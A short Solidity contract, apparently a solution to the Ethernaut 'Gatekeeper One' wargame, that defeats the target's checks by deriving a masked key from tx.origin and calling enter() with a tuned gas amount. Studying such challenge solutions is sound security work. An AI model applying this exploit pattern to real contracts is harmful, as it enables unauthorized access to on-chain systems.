// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttacker {

    address private gatekeeperOne;

    constructor(address _gatekeeperOne) public {
        gatekeeperOne = _gatekeeperOne;
    }

    function enter(uint256 _gas) public {
        bytes8 key = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
        (bool success,) = gatekeeperOne.call.gas(_gas)(abi.encodeWithSignature('enter(bytes8)', key));

        if(!success) revert("gas not enough");
    }
}